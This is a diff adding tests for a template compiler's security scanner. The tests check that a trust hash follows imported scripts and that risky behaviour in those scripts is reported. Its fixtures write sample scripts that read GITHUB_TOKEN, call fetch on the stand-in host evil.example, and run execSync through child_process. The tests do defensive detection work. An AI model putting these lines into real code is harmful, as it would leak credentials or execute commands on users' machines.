@@ -116,3 +116,60 @@ describe("protector: trust check", () => {
 		await expect(compile("uses-package.arcm")).rejects.toThrow(ProtectorError);
 	});
 });
+
+describe("protector: trust hash follows script imports", () => {
+	it("changes when a file a local script imports changes, also through a folder", async () => {
+		const { mkdtemp, mkdir } = await import("node:fs/promises");
+		const { tmpdir } = await import("node:os");
+		const dir = await mkdtemp(join(tmpdir(), "arcmoon-trust-"));
+		try {
+			await mkdir(join(dir, "site"));
+			await mkdir(join(dir, "theme/lib"), { recursive: true });
+			await writeFile(join(dir, "theme/Hero.arcm"), `\${ import h from "./helper.js"; }\$\n[section]hero[end]`);
+			await writeFile(join(dir, "theme/helper.js"), `import "./deep.js";\nimport "./lib";\nexport default 1;\n`);
+			await writeFile(join(dir, "theme/deep.js"), "export const x = 1;\n");
+			await writeFile(join(dir, "theme/lib/index.js"), "export const y = 1;\n");
+			await writeFile(join(dir, "site/page.arcm"), `[import = Hero: "../theme/Hero.arcm" !]\n[Hero!]`);
+
+			const siteHost = { resolve: (p, from) => resolve(dirname(from), p), readFile: (f) => readFile(f, "utf8") };
+			const hashOf = async () => (await analyze(await loadModules({ id: join(dir, "site/page.arcm") }, siteHost), { root: join(dir, "site") })).templates[0].hash;
+
+			const before = await hashOf();
+			await writeFile(join(dir, "theme/deep.js"), `import("node:child_process").then((c) => c.execSync("id"));\n`);
+			const afterDeep = await hashOf();
+			expect(afterDeep).not.toBe(before);
+			await writeFile(join(dir, "theme/lib/index.js"), "export const y = 2;\n");
+			expect(await hashOf()).not.toBe(afterDeep);
+		} finally {
+			await rm(dir, { recursive: true, force: true });
+		}
+	});
+});
+
+describe("protector: local scripts are scanned", () => {
+	it("reports what a script and the files it imports do, at their own lines", async () => {
+		const { mkdtemp, mkdir } = await import("node:fs/promises");
+		const { tmpdir } = await import("node:os");
+		const dir = await mkdtemp(join(tmpdir(), "arcmoon-scan-"));
+		try {
+			await mkdir(join(dir, "site"));
+			await mkdir(join(dir, "theme"));
+			await writeFile(join(dir, "theme/Hero.arcm"), `\${ import h from "./helper.js"; }\$\n[section]hero[end]`);
+			await writeFile(join(dir, "theme/helper.js"), `import "./deep.js";\nexport const token = process.env.GITHUB_TOKEN;\nfetch("https://evil.example/collect");\n`);
+			await writeFile(join(dir, "theme/deep.js"), `import { execSync } from "node:child_process";\nexport const run = () => execSync("id");\neval("1");\n`);
+			await writeFile(join(dir, "site/page.arcm"), `[import = Hero: "../theme/Hero.arcm" !]\n[Hero!]`);
+
+			const siteHost = { resolve: (p, from) => resolve(dirname(from), p), readFile: (f) => readFile(f, "utf8") };
+			const { templates } = await analyze(await loadModules({ id: join(dir, "site/page.arcm") }, siteHost), { root: join(dir, "site") });
+			const { report } = templates[0];
+			expect([...report.risky]).toEqual(["child_process"]);
+			expect([...report.fetch]).toEqual(["evil.example"]);
+			expect([...report.env]).toEqual(["GITHUB_TOKEN"]);
+			expect(report.dynamic).toEqual([`eval() at ${join(dir, "theme/deep.js")}:3:1`]);
+			expect([...report.localScripts].map((f) => f.slice(dir.length + 1)).sort()).toEqual(["theme/deep.js", "theme/helper.js"]);
+			expect(report.exports).toEqual([]);
+		} finally {
+			await rm(dir, { recursive: true, force: true });
+		}
+	});
+});
